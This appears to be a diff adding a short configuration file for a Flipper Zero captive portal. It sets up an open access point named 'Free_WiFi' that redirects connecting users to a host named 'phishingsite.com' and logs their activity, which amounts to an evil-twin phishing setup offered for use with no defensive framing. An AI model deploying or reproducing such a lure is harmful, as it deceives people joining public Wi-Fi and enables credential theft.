@@ -1,0 +1,12 @@
+# Captive Portal Configuration File for Flipper Zero
+
+[CaptivePortal]
+EnableCaptivePortal = true
+SSID = Free_WiFi
+PortalPage = index.html
+RedirectURL = http://phishingsite.com
+LogFile = captive_portal_log.txt
+
+[Logging]
+EnableLogging = true
+LogLevel = Info
